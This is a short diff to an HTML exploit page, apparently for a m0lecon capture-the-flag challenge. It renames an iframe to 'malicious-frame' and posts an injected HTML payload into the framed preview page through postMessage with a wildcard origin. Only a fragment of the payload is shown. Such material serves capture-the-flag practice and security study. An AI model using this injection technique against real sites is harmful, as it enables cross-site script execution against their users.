@@ -2,7 +2,7 @@
 <html>
     <body>
         <iframe
-            id="f"
+            id="malicious-frame"
             src="https://a85c42f4-3fbe-4b24-a033-93234ca321ae.offsec.m0lecon.it/preview"
         ></iframe>
         <script>
@@ -16,9 +16,9 @@
               })();
             ">`;
 
-            document.getElementById("preview-frame").onload = () => {
+            document.getElementById("malicious-frame").onload = () => {
                 document
-                    .getElementById("preview-frame")
+                    .getElementById("malicious-frame")
                     .contentWindow.postMessage({ html: payload }, "*");
             };
         </script>
